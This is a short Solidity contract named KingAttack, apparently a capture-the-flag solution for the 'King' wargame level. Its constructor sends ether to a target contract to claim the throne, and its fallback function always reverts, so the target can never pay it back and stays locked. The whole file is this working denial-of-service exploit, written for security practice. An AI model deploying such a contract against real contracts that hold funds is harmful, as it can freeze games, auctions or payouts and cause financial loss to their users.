pragma solidity 0.6.4;

contract KingAttack {
    constructor (address payable _addr) public payable {
        _addr.call{value: msg.value}("");
    }
    fallback() external payable {
        revert("bla");
    }
}